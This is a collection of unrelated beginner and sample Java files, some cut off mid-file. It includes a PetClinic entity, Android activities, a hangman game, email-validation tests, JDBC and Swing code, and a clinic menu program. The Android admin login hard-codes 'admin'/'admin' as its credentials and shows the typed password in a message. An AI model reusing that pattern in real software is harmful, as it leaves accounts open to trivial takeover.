    "/*\n * Copyright 2012-2019 the original author or authors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage org.springframework.samples.petclinic.vet;\n\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\n\nimport javax.persistence.Entity;\nimport javax.persistence.FetchType;\nimport javax.persistence.JoinColumn;\nimport javax.persistence.JoinTable;\nimport javax.persistence.ManyToMany;\nimport javax.persistence.Table;\nimport javax.xml.bind.annotation.XmlElement;\n\nimport org.springframework.beans.support.MutableSortDefinition;\nimport org.springframework.beans.support.PropertyComparator;\nimport org.springframework.samples.petclinic.model.Person;\n\n/**\n * Simple JavaBean domain object representing a veterinarian.\n *\n * @author Ken Krebs\n * @author Juergen Hoeller\n * @author Sam Brannen\n * @author Arjen Poutsma\n */\n@Entity\n@Table(name = \"vets\")\npublic class Vet extends Person {\n\n\t@ManyToMany(fetch = FetchType.EAGER)\n\t@JoinTable(name = \"vet_specialties\", joinColumns = @JoinColumn(name = \"vet_id\"),\n\t\t\tinverseJoinColumns = @JoinColumn(name = \"specialty_id\"))\n\tprivate Set<Specialty> specialties;\n\n\tprotected Set<Specialty> getSpecialtiesInternal() {\n\t\tif (this.specialties == null) {\n\t\t\tthis.specialties = new HashSet<>();\n\t\t}\n\t\treturn this.specialties;\n\t}\n\n\tprotected void setSpecialtiesInternal(Set<Specialty> specialties) {\n\t\tthis.specialties = specialties;\n\t}\n\n\t@XmlElement\n\tpublic List<Specialty> getSpecialties() {\n\t\tList<Specialty> sortedSpecs = new ArrayList<>(getSpecialtiesInternal());\n\t\tPropertyComparator.sort(sortedSpecs, new MutableSortDefinition(\"name\", true, true));\n\t\treturn Collections.unmodifiableList(sortedSpecs);\n\t}\n\n\tpublic int getNrOfSpecialties() {\n\t\treturn getSpecialtiesInternal().size();\n\t}\n\n\tpublic void addSpecialty(Specialty specialty) {\n\t\tgetSpecialtiesInternal().add(specialty);\n\t}\n\n}\n",
    "\r\n\timport java.io.*;\r\n\timport java.lang.reflect.*;\r\n\timport java.util.*;\r\n\timport java.text.*;\r\n\timport java.math.*;\r\n\timport java.util.regex.*;\r\n\tclass Add {\r\n\t    public void add(int... intArgs) {\r\n\t        int sum = 0;\r\n\t        String separator = \"\";\r\n\t        for (int i : intArgs) {\r\n\t            sum += i;\r\n\t            System.out.print(separator + i);\r\n\t            separator = \"+\";            \r\n\t        }\r\n\t        System.out.println(\"=\" + sum);\r\n\t    }\r\n\t}\r\n\r\n\r\n\tpublic class Vararags {\r\n\r\n\t    public static void main(String[] args) {\r\n\t       try{\r\n\t\t\t\tBufferedReader br=new BufferedReader(new InputStreamReader(System.in));\r\n\t\t\t\tint n1=Integer.parseInt(br.readLine());\r\n\t\t\t\tint n2=Integer.parseInt(br.readLine());\r\n\t\t\t\tint n3=Integer.parseInt(br.readLine());\r\n\t\t\t\tint n4=Integer.parseInt(br.readLine());\r\n\t\t\t\tint n5=Integer.parseInt(br.readLine());\r\n\t\t\t\tint n6=Integer.parseInt(br.readLine());\r\n\t\t\t\tAdd ob=new Add();\r\n\t\t\t\tob.add(n1,n2);\r\n\t\t\t\tob.add(n1,n2,n3);\r\n\t\t\t\tob.add(n1,n2,n3,n4,n5);\t\r\n\t\t\t\tob.add(n1,n2,n3,n4,n5,n6);\r\n\t\t\t\tMethod[] methods=Add.class.getDeclaredMethods();\r\n\t\t\t\tSet<String> set=new HashSet<>();\r\n\t\t\t\tboolean overload=false;\r\n\t\t\t\tfor(int i=0;i<methods.length;i++)\r\n\t\t\t\t{\r\n\t\t\t\t\tif(set.contains(methods[i].getName()))\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\toverload=true;\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tset.add(methods[i].getName());\r\n\t\t\t\t\t\r\n\t\t\t\t}\r\n\t\t\t\tif(overload)\r\n\t\t\t\t{\r\n\t\t\t\t\tthrow new Exception(\"Overloading not allowed\");\r\n\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\tcatch(Exception e)\r\n\t\t\t\t{\r\n\t\t\t\t\te.printStackTrace();\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\r\n\t\t\r\n\r\n\t}\r\n\r\n\r\n",
    "package com.example.myapplication;\n\nimport android.content.Intent;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.TextView;\nimport android.widget.Toast;\nimport androidx.appcompat.app.AppCompatActivity;\nimport android.os.Bundle;\n\npublic class loginAdmin extends AppCompatActivity {\n\n    EditText adminMobnum;\n    EditText adminPass;\n    Button adminSigninButton;\n    TextView userLoginButton;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_login_admin);\n\n        adminMobnum = findViewById(R.id.adminMobnum);\n        adminPass = findViewById(R.id.adminPass);\n        userLoginButton = findViewById(R.id.userLoginButton);\n        adminSigninButton = findViewById(R.id.adminSigninButton);\n\n\n        adminSigninButton.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                String mobnumAdmin = adminMobnum.getText().toString();\n                String passAdmin = adminPass.getText().toString();\n\n                if (mobnumAdmin.equals(\"\") || passAdmin.equals(\"\"))\n                    Toast.makeText(loginAdmin.this, \"Please enter all the fields \"+mobnumAdmin+\" \"+passAdmin, Toast.LENGTH_SHORT).show();\n                else {\n                    if (mobnumAdmin.equals(\"admin\") && passAdmin.equals(\"admin\")) {\n                        Toast.makeText(loginAdmin.this, \"Login Successful\", Toast.LENGTH_SHORT).show();\n                        Intent intent = new Intent(getApplicationContext(), homeAdmin.class);\n                        startActivity(intent);\n\n                    }\n                    else {\n                        Toast.makeText(loginAdmin.this, \"Invalid credentials\", Toast.LENGTH_SHORT).show();\n                    }\n\n\n\n            }\n        userLoginButton.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                startActivity(new Intent(getApplicationContext(), LoginForm.class));\n            }\n        });\n\n        };\n\n\n\n    });\n}}",
    "package com.example.shop;\n\nimport android.app.Activity;\nimport android.content.Intent;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.ImageView;\nimport android.widget.Toast;\n\nimport androidx.activity.EdgeToEdge;\nimport androidx.annotation.Nullable;\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport com.bumptech.glide.Glide;\nimport com.bumptech.glide.request.RequestOptions;\nimport com.example.shop.application.HomeApplication;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private ImageView ivAvatar;\n    private ImageView ivProfilePicture;\n    private Button btnRegister;\n\n    private static final int IMAGE_PICK_CODE = 1000;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        EdgeToEdge.enable(this);\n        setContentView(R.layout.activity_main);\n\n        ivAvatar = findViewById(R.id.ivAvatar);\n        ivProfilePicture = findViewById(R.id.ivProfilePicture);\n        btnRegister = findViewById(R.id.btnRegister);\n\n        //Server ip\n        //http://10.0.2.2:5297/images/1.png\n        //String url = \"https://content1.rozetka.com.ua/goods/images/big/415679366.jpg\";\n        String url = \"http://10.0.2.2:5297/images/1.png\";\n\n        Glide.with(HomeApplication.getAppContext())\n                .load(url)\n                .apply(new RequestOptions().override(400))\n                .into(ivAvatar);\n\n        btnRegister.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                Toast.makeText(MainActivity.this, \"Register button clicked\", Toast.LENGTH_SHORT).show();\n            }\n        });\n\n        ivProfilePicture.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                // \u0412\u0438\u0431\u0456\u0440 \u0444\u043e\u0442\u043e\n                pickImageFromGallery();\n            }\n        });\n    }\n\n    private void pickImageFromGallery() {\n        Intent intent = new Intent(Intent.ACTION_PICK);\n        intent.setType(\"image/*\");\n        startActivityForResult(intent, IMAGE_PICK_CODE);\n    }\n\n    @Override\n    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {\n        super.onActivityResult(requestCode, resultCode, data);\n        if (resultCode == Activity.RESULT_OK && requestCode == IMAGE_PICK_CODE) {\n            ivProfilePicture.setImageURI(data.getData());\n        }\n    }\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\n */\npackage core;\n\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.Date;\n\n/**\n *\n * @author MAXETTE\n */\npublic abstract class Contact {\n    \n    private int code;\n    private String nom;\n    private Date dateNaissance;\n    private String address;\n    private String email;\n    private int telNumber;\n\n    public Contact(int code,String nom, Date dateNaissance, String address, String email, int telNumber) {\n        this.code = code;\n        this.nom = nom;\n        this.dateNaissance = dateNaissance;\n        this.address = address;\n        this.email = email;\n        this.telNumber = telNumber;\n    }\n\n    public int getcode(){\n        return code;\n    }\n    \n    public void setcode(int code){\n        this.code=code;\n    }\n    \n    public String getnom(){\n        return nom;\n    }\n    \n    public void setcode(String nom){\n        this.nom=nom;\n    }\n    public Date getdateNaissance(){\n        return dateNaissance;\n    }\n    \n    public void setdateNaissance(Date dateNaissance){\n        this.dateNaissance=dateNaissance;\n    }\n    public String getaddress(){\n        return address;\n    }\n    \n    public void setaddress(String address){\n        this.address=address;\n    }\n    public String getemail(){\n        return email;\n    }\n    \n    public void setemail(String email){\n        this.email=email;\n    }\n    public int gettelNumber(){\n        return telNumber;\n    }\n    \n    public void settelNumber(int telNumber){\n        this.telNumber=telNumber;\n    }\n    \n     public abstract void insererDansBaseDeDonnees() throws SQLException;\n}\n\n    \n\n",
    "import java.util.Random;\nimport java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        final String wordToGuess;\n        String hiddenWord;\n\n        final String[] words = {\"java\", \"skillman\", \"python\", \"test\"};\n        final int MAX_INC0RRECT_GUESSES = 7;\n        final Scanner scanner = new Scanner(System.in);\n        int incorrectGuesses = 0;\n\n        wordToGuess = selectWord(words);\n        hiddenWord = hiddentoWord(wordToGuess);\n\n        System.out.println(\"Welcom to Hangman!\");\n        System.out.println(hiddenWord);\n\n        while (incorrectGuesses < MAX_INC0RRECT_GUESSES && hiddenWord.contains(\"_\")) {\n            System.out.println(\"Enter a letter: \");\n            char guess = scanLetter(scanner);\n\n            if (wordToGuess.contains(String.valueOf(guess))){\n                hiddenWord = revealLetters(wordToGuess, hiddenWord, guess);\n                System.out.println(\"spravny znak, aktualizovane slovo \" + hiddenWord);\n            } else {\n                incorrectGuesses++;\n                System.out.println(\"Spatne pismenko mate \" + (MAX_INC0RRECT_GUESSES - incorrectGuesses) + \" zb\u00fdvaj\u00edc\u00edch pokus\u016f\");\n            }\n        }\n\n        if (!hiddenWord.contains(\"_\")){\n            System.out.println(\"Super, vyhral jsi\");\n        } else {\n            System.out.println(\"Bohu\u017eel nepovedlo se\");\n        }\n    }\n\n\n    public static String revealLetters(String wordToGuess, String hiddenWord, char letter){\n        char[] hiddenWordChars = hiddenWord.toCharArray();\n        for (int i = 0; i < wordToGuess.length(); i++){\n            if (wordToGuess.charAt(i) == letter) {\n                hiddenWordChars[i] = letter;\n            }\n        }\n        return String.valueOf(hiddenWordChars);\n    }\n    public static char scanLetter(Scanner scanner){\n        //return scanner.next().charAt(0);\n        char guess;\n        while (true) {\n            try {\n                String line = scanner.nextLine();\n                if (line.length() != 1){\n                    throw new Exception(\"Invalid input: Zadali jste v\u00edce ne\u017e jeden znak\");\n                }\n\n                guess = line.charAt(0);\n                if (!Character.isLetter(guess)){\n                    throw new Exception(\"Invalid input: nezadali jste pismenko\");\n                }\n                break;\n            } catch (Exception e){\n                System.out.println(\"Invalid input: \" + e.getMessage());\n            }\n        }\n\n        return guess;\n    }\n\n    public static String selectWord(String[] words){\n        Random random = new Random();\n        return words[random.nextInt(words.length)];\n    }\n\n    public static String hiddentoWord(String randomWord){\n        Random random = new Random();\n        return \"_\".repeat(randomWord.length());\n    }\n}",
    "package ant.qa.tradecrypto.tests.userSide;\n\nimport ant.qa.tradecrypto.base.BaseTest;\nimport org.testng.Assert;\nimport org.testng.annotations.BeforeClass;\nimport org.testng.annotations.Test;\n\npublic class RegisterPageTest extends BaseTest {\n\n    String errmsg;\n\n    @BeforeClass\n    public void preReq()\n    {\n       registerPage =  homePage.goToSignUp();\n    }\n    @Test\n    public void registerPageTitleTest()\n    {\n        String actTitle =  registerPage.getRegisterPageTitle();\n        Assert.assertEquals(actTitle, \"Domus\");\n    }\n    @Test(priority = 33)\n    public void emailNotBeEmpty() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"\");\n        Assert.assertEquals(errmsg, \"*Email is required\");\n    }\n    @Test(priority = 34)\n    public void invalidEmail1() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"Abc.example.com\");\n        Assert.assertEquals(errmsg, \"*Invalid Email\");\n    }\n    @Test(priority = 35)\n    public void invalidEmail2() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"A@b@c@example.com\");\n        Assert.assertEquals(errmsg, \"*Invalid Email\");\n    }\n    @Test(priority = 36)\n    public void invalidEmail3() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"a\\\"b(c)d,e:f;g<h>i[j\\\\k]l@example.com\");\n        Assert.assertEquals(errmsg, \"*Invalid Email\");\n    }\n    @Test(priority = 37)\n    public void invalidEmail4() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"just\\\"not\\\"right@example.com\");\n        Assert.assertEquals(errmsg, \"*Invalid Email\");\n    }\n    @Test(priority = 38)\n    public void invalidEmail5() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"this is\\\"not\\\\allowed@example.com\");\n        Assert.assertEquals(errmsg, \"*Invalid Email\");\n    }\n    @Test(priority = 39)\n    public void invalidEmail6() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"this\\\\ still\\\\\\\"not\\\\\\\\allowed@example.com\");\n        Assert.assertEquals(errmsg, \"*Invalid Email\");\n    }\n    @Test(priority = 40, enabled = false)\n    public void invalidEmail7() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"1234567890123456789012345678901234567890123456789012345678901234+x@example.com\");\n        Assert.assertEquals(errmsg, \"\");\n    }\n    @Test(priority = 41, enabled = false)\n    public void invalidEmail8() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"i_like_underscore@but_its_not_allowed_in_this_part.example.com\");\n        Assert.assertEquals(errmsg, \"*Invalid Email\");\n    }\n    @Test(priority = 42)\n    public void validEmail1() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"simple@example.com\");\n        Assert.assertEquals(errmsg, \"\");\n    }\n    @Test(priority = 43)\n    public void validEmail2() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"very.common@example.com\");\n        Assert.assertEquals(errmsg, \"\");\n    }\n    @Test(priority = 44)\n    public void validEmail3() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"disposable.style.email.with+symbol@example.com\");\n        Assert.assertEquals(errmsg, \"\");\n    }\n    @Test(priority = 45)\n    public void validEmail4() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"other.email-with-hyphen@and.subdomains.example.com\");\n        Assert.assertEquals(errmsg, \"\");\n    }\n    @Test(priority = 46)\n    public void validEmail5() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"fully-qualified-domain@example.com\");\n        Assert.assertEquals(errmsg, \"\");\n    }\n    @Test(priority = 47)\n    public void validEmail6() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"x@example.com\");\n        Assert.assertEquals(errmsg, \"\");\n    }\n    @Test(priority = 48)\n    public void validEmail7() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"example-indeed@strange-example.com\");\n        Assert.assertEquals(errmsg, \"\");\n    }\n    @Test(priority = 49)\n    public void validEmail8() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"test/test@test.com\");\n        Assert.assertEquals(errmsg, \"\");\n    }\n    @Test(priority = 50)\n    public void validEmail9() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"example@s.example\");\n        Assert.assertEquals(errmsg, \"\");\n    }\n    @Test(priority = 51, enabled = false)\n    public void validEmail10() throws InterruptedException {\n        errmsg = registerPage.createAccountNegative(\"\\\" \\\"@example.org\");\n        Assert.assertEquals(errmsg, \"\");\n    }\n    @Test(priority = 52, enabled = false)\n    public void validEmail11() throws InterruptedException {\n ",
    "import java.sql.*;\n\npublic class PatientInfo {\n    public static void main(String[] args) {\n        try {\n            // Step 1: Load the JDBC driver\n            Class.forName(\"oracle.jdbc.driver.OracleDriver\");\n\n            // Step 2: Establish a connection\n            Connection connection = DriverManager.getConnection(\n                    \"jdbc:oracle:thin:@localhost:1521:xe\", \"bhagiradhija\", \" \");\n\n            // Step 3: Create a statement\n            Statement statement = connection.createStatement();\n\n            // Step 4: Execute the query\n            ResultSet resultSet = statement.executeQuery(\"SELECT patient_id, name, problem, bill FROM patients\");\n\n            // Step 5: Process the results\n            while (resultSet.next()) {\n                int patientId = resultSet.getInt(\"patient_id\");\n                String name = resultSet.getString(\"name\");\n                String problem = resultSet.getString(\"problem\");\n                double bill = resultSet.getDouble(\"bill\");\n\n                System.out.println(\"Patient ID: \" + patientId);\n                System.out.println(\"Name: \" + name);\n                System.out.println(\"Problem: \" + problem);\n                System.out.println(\"Bill: \" + bill);\n                System.out.println(\"--------------------------------------\");\n            }\n\n            // Step 6: Close the connection\n            resultSet.close();\n            statement.close();\n            connection.close();\n\n        } catch (Exception e) {\n            System.err.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
    "package aggregates_parallel;\n\nimport java.sql.*;\nimport java.util.ArrayList;\nimport javax.swing.*;\nimport javax.swing.table.*;\nimport java.util.Arrays;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.TimeUnit;\nimport java.util.List;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\n\n\npublic class NewJFrame extends javax.swing.JFrame {\n\n    private Connection con;\n    private DefaultTableModel table;\n\n    public NewJFrame() {\n    initComponents();\n    this.setLocationRelativeTo(null);\n    Connection();\n    this.table = (DefaultTableModel) tblRecord.getModel();\n    showData(); // Call showData here to populate the table\n}\n\n\n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jPanel1 = new javax.swing.JPanel();\n        jLabel1 = new javax.swing.JLabel();\n        txtLocationCode = new javax.swing.JTextField();\n        jLabel2 = new javax.swing.JLabel();\n        jLabel3 = new javax.swing.JLabel();\n        txtDatePosted = new javax.swing.JTextField();\n        cboxAggregate = new javax.swing.JComboBox<>();\n        btnSubmit = new javax.swing.JButton();\n        jScrollPane2 = new javax.swing.JScrollPane();\n        tblRecord = new javax.swing.JTable();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        jPanel1.setBackground(new java.awt.Color(153, 153, 255));\n        jPanel1.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));\n\n        jLabel1.setFont(new java.awt.Font(\"Segoe UI\", 0, 18)); // NOI18N\n        jLabel1.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);\n        jLabel1.setText(\"Select function:\");\n\n        txtLocationCode.setBackground(new java.awt.Color(204, 204, 255));\n        txtLocationCode.addKeyListener(new java.awt.event.KeyAdapter() {\n            public void keyReleased(java.awt.event.KeyEvent evt) {\n                txtLocationCodeKeyReleased(evt);\n            }\n        });\n\n        jLabel2.setFont(new java.awt.Font(\"Segoe UI\", 0, 14)); // NOI18N\n        jLabel2.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);\n        jLabel2.setText(\"Location Code:\");\n\n        jLabel3.setFont(new java.awt.Font(\"Segoe UI\", 0, 14)); // NOI18N\n        jLabel3.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);\n        jLabel3.setText(\"Date Posted:\");\n\n        txtDatePosted.setBackground(new java.awt.Color(204, 204, 255));\n        txtDatePosted.addKeyListener(new java.awt.event.KeyAdapter() {\n            public void keyReleased(java.awt.event.KeyEvent evt) {\n                txtDatePostedKeyReleased(evt);\n            }\n        });\n\n        cboxAggregate.setBackground(new java.awt.Color(204, 204, 255));\n        cboxAggregate.setModel(new javax.swing.DefaultComboBoxModel<>(new String[] { \"MIN\", \"MAX\", \"COUNT\", \"SUM\", \"AVG\" }));\n        cboxAggregate.setAlignmentX(0.0F);\n        cboxAggregate.setAlignmentY(0.0F);\n        cboxAggregate.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                cboxAggregateActionPerformed(evt);\n            }\n        });\n\n        btnSubmit.setBackground(new java.awt.Color(204, 204, 255));\n        btnSubmit.setFont(new java.awt.Font(\"Segoe UI\", 0, 14)); // NOI18N\n        btnSubmit.setText(\"Submit\");\n        btnSubmit.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                btnSubmitActionPerformed(evt);\n            }\n        });\n\n        tblRecord.setModel(new javax.swing.table.DefaultTableModel(\n            new Object [][] {\n\n            },\n            new String [] {\n                \"LocationCode\", \"DatePosted\", \"Total Amount\"\n            }\n        ));\n        jScrollPane2.setViewportView(tblRecord);\n\n        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);\n        jPanel1.setLayout(jPanel1Layout);\n        jPanel1Layout.setHorizontalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel1Layout.createSequentialGroup()\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addGroup(jPanel1Layout.createSequentialGroup()\n                        .addGap(357, 357, 357)\n                        .addComponent(btnSubmit, javax.swing.GroupLayout.PREFERRED_SIZE, 86, javax.swing.GroupLayout.PREFERRED_SIZE))\n                    .addGroup(jPanel1Layout.createSequentialGroup()\n                        .addGap(63, 63, 63)\n                        .addGroup(jPa",
    "import java.util.Collections;\nimport java.util.Comparator;\nimport java.util.LinkedList;\n\nclass Employee {\n    private int id;\n    private String name;\n    private String designation;\n    private double salary;\n\n    public Employee(int id, String name, String designation, double salary) {\n        this.id = id;\n        this.name = name;\n        this.designation = designation;\n        this.salary = salary;\n    }\n\n    public int getId() {\n        return id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public String getDesignation() {\n        return designation;\n    }\n\n    public double getSalary() {\n        return salary;\n    }\n\n    @Override\n    public String toString() {\n        return \"Employee{\" +\n                \"id=\" + id +\n                \", name='\" + name + '\\'' +\n                \", designation='\" + designation + '\\'' +\n                \", salary=\" + salary +\n                '}';\n    }\n}\n\npublic class Main {\n    public static void main(String[] args) {\n        LinkedList<Employee> employees = new LinkedList<>();\n        employees.add(new Employee(101, \"John\", \"Manager\", 50000));\n        employees.add(new Employee(102, \"Alice\", \"Developer\", 60000));\n        employees.add(new Employee(103, \"Bob\", \"Tester\", 45000));\n        employees.add(new Employee(104, \"Carol\", \"Designer\", 55000));\n\n        System.out.println(\"Unsorted List:\");\n        printList(employees);\n\n        Collections.sort(employees, Comparator.comparing(Employee::getName));\n        System.out.println(\"\\nSorted by Name:\");\n        printList(employees);\n\n        Collections.sort(employees, Comparator.comparing(Employee::getSalary));\n        System.out.println(\"\\nSorted by Salary:\");\n        printList(employees);\n    }\n\n    private static void printList(LinkedList<Employee> employees) {\n        for (Employee emp : employees) {\n            System.out.println(emp);\n        }\n    }\n}\n",
    "package edu.pitt.cs;\n\nimport org.mockito.Mockito;\n\npublic interface RentACat {\n\tpublic static RentACat createInstance(InstanceType type) {\n\t\tswitch (type) {\n\t\t\tcase IMPL:\n\t\t\t\treturn new RentACatImpl();\n\t\t\tcase BUGGY:\n\t\t\t\treturn new RentACatBuggy();\n\t\t\tcase SOLUTION:\n\t\t\t\treturn new RentACatSolution();\n\t\t\tcase MOCK:\n\t\t\t\t// TODO: Return a mock object that emulates the behavior of a real object.\n\t\t\tRentACatImpl mockRentACat = Mockito.mock(RentACatImpl.class);\n\t\t\t\tMockito.when(mockRentACat.rentCat(1)).thenReturn(true);\n\t\t\t\tMockito.when(mockRentACat.returnCat(1)).thenReturn(true);\n\t\t\t\tMockito.when(mockRentACat.renameCat(1, \"Jennyanydots\")).thenReturn(true);\n\t\t\t\tMockito.when(mockRentACat.listCats()).thenReturn(\"1: Jennyanydots (available)\");\n\t\t\t\tMockito.doNothing().when(mockRentACat).addCat(Mockito.any(Cat.class));\n\t\t\t\treturn mockRentACat;\n\t\t\tdefault:\n\t\t\t\tassert (false);\n\t\t\t\treturn null;\n\t\t}\n\t}\n\n\t// WARNING: You are not allowed to change any part of the interface.\n\t// That means you cannot add any method nor modify any of these methods.\n\n\tpublic boolean returnCat(int id);\n\n\tpublic boolean rentCat(int id);\n\n\tpublic boolean renameCat(int id, String name);\n\n\tpublic String listCats();\n\n\tpublic void addCat(Cat c);\n}\n",
    "package application;\n\nimport java.io.IOException;\nimport java.util.InputMismatchException;\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.Scanner;\n\nimport model.entities.AtestadoMedico;\nimport model.entities.CarnePagamento;\nimport model.entities.Consulta;\nimport model.entities.Funcionario;\nimport model.entities.Medico;\nimport model.entities.Patients;\nimport model.entities.Relatorio;\nimport model.entities.SistemaClinica;\nimport model.exceptions.DomainException;\nimport model.util.FileHandler;\nimport model.util.FileHandlerLogin;\n\npublic class Program {\n    public static void main(String[] args) throws IOException {\n        Locale.setDefault(Locale.US);\n        Scanner sc = new Scanner(System.in);\n        \n        FileHandlerLogin fileHandlerLogin = new FileHandlerLogin(\"dados_login.txt\");\n        \n        System.out.println(\"Digite senha e login para sua seguran\u00e7a!\");\n\t\tSystem.out.print(\"Login: \");\n\t\tString loginOutput = sc.nextLine();\n\t\tSystem.out.print(\"Password: \");\n\t\tString passwordOutput = sc.nextLine();\n\t\t\n        try {\n            fileHandlerLogin.clearFile(loginOutput, passwordOutput);\n\n            SistemaClinica sistema = new SistemaClinica();\n            List<Patients> patients = sistema.getPatients();\n            FileHandler fileHandler = new FileHandler(\"data.txt\");\n            fileHandler.clearFile();\n\n            while (true) {\n                System.out.println(\"\\nEscolha uma op\u00e7\u00e3o:\");\n                System.out.println(\"1 - Adicionar m\u00e9dico\");\n                System.out.println(\"2 - Alterar m\u00e9dico\");\n                System.out.println(\"3 - Remover m\u00e9dico\");\n                System.out.println(\"4 - Listar m\u00e9dicos\");\n                System.out.println(\"5 - Adicionar paciente\");\n                System.out.println(\"6 - Alterar paciente\");\n                System.out.println(\"7 - Remover paciente\");\n                System.out.println(\"8 - Listar pacientes\"); //\n                System.out.println(\"9 - Adicionar funcionario\");\n                System.out.println(\"10 - Alterar funcionario\");\n                System.out.println(\"11 - Remover funcionario\");\n                System.out.println(\"12 - Listar funcionarios\");\n                System.out.println(\"13 - Adicionar consulta\");\n                System.out.println(\"14 - Marcar consulta como paga\");\n                System.out.println(\"15 - Adicionar evolu\u00e7\u00e3o do paciente\");\n                System.out.println(\"16 - Listar consultas pendentes de pagamento\");\n                System.out.println(\"17 - Listar evolu\u00e7\u00e3o do paciente\");\n                System.out.println(\"18 - Emitir atestado m\u00e9dico\");\n                System.out.println(\"19 - Emitir carn\u00ea de pagamento\");\n                System.out.println(\"20 - Emitir relat\u00f3rios\");\n                System.out.println(\"0 - Sair\");\n                \n                Integer choice;\n                \n                try {\n                    choice = sc.nextInt();\n                    sc.nextLine();                 } \n                catch (InputMismatchException e) {\n                    System.out.println(\"Por favor, insira um n\u00famero v\u00e1lido.\");\n                    sc.nextLine(); \n                    continue;\n                }\n\n                String dataToSave;\n                switch (choice) {\n\t                case 1:\n\t\t\t\t\t    System.out.println(\"Digite o nome do m\u00e9dico:\");\n\t\t\t\t\t    String nomeMedico = sc.next();\n\t\t\t\t\t    System.out.println(\"Digite o CPF do m\u00e9dico:\");\n\t\t\t\t\t    String cpfMedico = sc.next();\n\t\t\t\t\t    System.out.println(\"Digite o telefone do m\u00e9dico:\");\n\t\t\t\t\t    String telefoneMedico = sc.next();\n\t\t\t\t\t    System.out.println(\"Digite a rua do m\u00e9dico:\");\n\t\t\t\t\t    String ruaMedico = sc.next();\n\t\t\t\t\t    System.out.println(\"Digite a cidade do m\u00e9dico:\");\n\t\t\t\t\t    String cidadeMedico = sc.next();\n\t\t\t\t\t    System.out.println(\"Digite o estado do m\u00e9dico:\");\n\t\t\t\t\t    String estadoMedico = sc.next();\n\t\t\t\t\t    System.out.println(\"Digite o sal\u00e1rio do m\u00e9dico:\");\n\t\t\t\t\t    double salarioMedico = sc.nextDouble();\n\t\t\t\t\t    System.out.println(\"Digite a fun\u00e7\u00e3o do m\u00e9dico:\");\n\t\t\t\t\t    String funcaoMedico = sc.next();\n\t\t\t\t\t    System.out.println(\"Digite a especialidade do m\u00e9dico:\");\n\t\t\t\t\t    String 